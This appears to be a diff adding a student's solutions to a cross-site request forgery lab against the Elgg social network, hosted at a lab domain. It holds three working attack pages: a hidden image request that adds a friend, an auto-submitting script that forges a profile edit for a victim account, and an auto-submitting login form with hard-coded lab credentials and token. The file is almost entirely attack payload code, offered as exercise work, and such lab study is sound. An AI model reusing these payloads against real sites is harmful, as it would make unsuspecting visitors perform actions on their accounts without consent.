@@ -1,0 +1,82 @@
+<!-------------任务一---------------->
+
+<html>
+	<head>
+		<title>
+			XuZichuan's malicious web
+		</title>
+	</head>
+	<body>
+		Hi, you are trapped!  :)
+		<img src="http://www.csrflabelgg.com/action/friends/add?friend=45" hidden/>
+	</body>
+</html>
+
+
+<!-------------任务二---------------->
+
+
+<html><body>
+	<h1>This page forges an HTTP POST request.</h1>
+	<script type="text/javascript">
+		function post(url,fields) {
+	
+			var p = document.createElement("form");
+		
+			p.action = url;
+			p.innerHTML = fields;
+			p.target = "_self";
+			p.method = "post";
+			
+			document.body.appendChild(p);
+		
+			p.submit();
+		}
+		function csrf_hack() {
+			var fields;
+			fields += "<input type='hidden' name='name' value='Alice'>";
+			fields += "<input type='hidden' name='description' value='Hi, this is XuZichuan'>";
+			fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
+			fields += "<input type='hidden' name='briefdescription' value=''>";
+			fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+			fields += "<input type='hidden' name='location' value=''>";
+			fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+			fields += "<input type='hidden' name='guid' value='42'>";
+			var url = "http://www.csrflabelgg.com/action/profile/edit";
+			post(url,fields);
+		}
+		
+		window.onload = function() { csrf_hack();}
+	</script>
+</body></html>
+
+<!-------------任务三---------------->
+
+<form method="post" action="http://www.csrflabelgg.com/action/login" class="elgg-form elgg-form-login">
+	<fieldset>
+		<input name="__elgg_token" value="3b7ba29a4a8fa5fb568389c21edf0fca" type="hidden">
+		<input name="__elgg_ts" value="1527493857" type="hidden">
+		<div>
+			<label>Username or email</label>
+			<input value="samy" name="username" class="elgg-input-text elgg-autofocus" type="text">
+		</div>
+		<div>
+			<label>Password</label>
+			<input value="seedsamy" name="password" class="elgg-input-password" type="password">
+		</div>
+		<div class="elgg-foot">
+			<label class="mtm float-alt">
+				<input name="persistent" value="true" type="checkbox">
+				Remember me
+			</label>
+			<input value="Log in" class="elgg-button elgg-button-submit" type="submit">
+			<ul class="elgg-menu elgg-menu-general mtm">
+				<li><a class="registration_link" href="http://www.csrflabelgg.com/register">Register</a></li>
+				<li><a class="forgot_link" href="http://www.csrflabelgg.com/forgotpassword">Lost password</a></li>
+			</ul>
+		</div>
+	</fieldset>
+</form>
+<script>
+	document.forms[0].submit();
+</script>
